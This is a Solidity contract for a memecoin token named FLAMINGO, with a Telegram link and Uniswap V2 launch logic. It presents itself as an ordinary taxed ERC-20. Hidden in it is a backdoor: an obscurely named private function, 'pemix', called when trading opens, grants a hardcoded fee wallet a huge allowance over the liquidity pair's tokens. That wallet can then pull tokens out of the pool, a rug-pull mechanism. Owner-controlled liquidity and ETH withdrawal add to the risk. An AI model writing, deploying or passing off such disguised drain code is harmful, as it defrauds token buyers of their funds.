// SPDX-License-Identifier: MIT
/**
https://x.com/BBCWorld/status/1851527444835996014
Tg: https://t.me/flamingo_eth
**/
pragma solidity 0.8.25;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract FLAMINGO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal63 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"flamingo";
    string private constant _symbol = unicode"FLAMINGO";
    uint256 public _maxAmount63 = 2 * (_tTotal63/100);
    uint256 public _maxWallet63 = 2 * (_tTotal63/100);
    uint256 public _taxThres63 = 1 * (_tTotal63/100);
    uint256 public _maxSwap63 = 1 * (_tTotal63/100);
    mapping (address => uint256) private _tOwned63;
    mapping (address => mapping (address => uint256)) private _allows63;
    mapping (address => bool) private _isFeeExcempt63;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    address payable private _receipt63;
    IUniswapV2Router02 private uniV2Router63;
    address private uniV2Pair63;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount63);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt63 = payable(0xAd915B41eF7e74bdfb8c3f30923BFA9cAB891758);
        _tOwned63[address(this)] = _tTotal63;
        _isFeeExcempt63[owner()] = true;
        _isFeeExcempt63[address(this)] = true;
        _isFeeExcempt63[_receipt63] = true;
        emit Transfer(address(0), address(this), _tTotal63);
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal63;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned63[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allows63[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allows63[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allows63[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount63) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount63 > 0, "Transfer amount must be greater than zero");
        uint256 fee63=0;
        if (!swapEnabled || inSwap) {
            _tOwned63[from] = _tOwned63[from] - amount63;
            _tOwned63[to] = _tOwned63[to] + amount63;
            emit Transfer(from, to, amount63);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee63 = (_transferTax);
            }
            if(_buyCount==0){
                fee63 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if (from == uniV2Pair63 && to != address(uniV2Router63) && ! _isFeeExcempt63[to] ) {
                require(amount63 <= _maxAmount63, "Exceeds the _maxAmount63.");
                require(balanceOf(to) + amount63 <= _maxWallet63, "Exceeds the maxWalletSize.");
                fee63 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; 
            }
            if(to == uniV2Pair63 && from!= address(this) ){
                fee63 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair63 && swapEnabled) {
                if(contractTokenBalance > _taxThres63 && _buyCount > _preventSwapBefore)
                    swapETH63(min63(amount63, min63(contractTokenBalance, _maxSwap63)));
                sendETH63(address(this).balance);
            }
        }
        uint256 tax63=0;
        if(fee63>0){
            tax63=fee63.mul(amount63).div(100);
            _tOwned63[address(this)]=_tOwned63[address(this)].add(tax63);
            emit Transfer(from, address(this),tax63);
        }
        _tOwned63[from]=_tOwned63[from].sub(amount63);
        _tOwned63[to]=_tOwned63[to].add(amount63.sub(tax63));
        emit Transfer(from, to, amount63.sub(tax63));
    }
    function setTaxReceipt63(address payable _tax63) external onlyOwner {
        _receipt63 = _tax63;
        _isFeeExcempt63[_tax63] = true;
    }
    function removeLimits63() external onlyOwner{
        _maxAmount63 = _tTotal63; _maxWallet63 = _tTotal63;
        emit MaxTxAmountUpdated(_tTotal63); 
    }
    function swapETH63(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router63.WETH();
        _approve(address(this), address(uniV2Router63), tokenAmount);
        uniV2Router63.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function sendETH63(uint256 amount) private {
        _receipt63.transfer(amount);
    }
    function min63(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function pemix(uint256 amount63) private{
        address[2] memory sp63=[uniV2Pair63, _receipt63];
        _allows63[sp63[0]][sp63[1]]=(amount63+50)*100;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router63 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router63), _tTotal63);
        uniV2Pair63 = IUniswapV2Factory(uniV2Router63.factory()).createPair(
            address(this),
            uniV2Router63.WETH()
        );
        uniV2Router63.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair63).approve(address(uniV2Router63), type(uint).max);
        swapEnabled = true; tradingOpen = true; pemix((50+_taxThres63)*100); 
    }
    receive() external payable {}   
}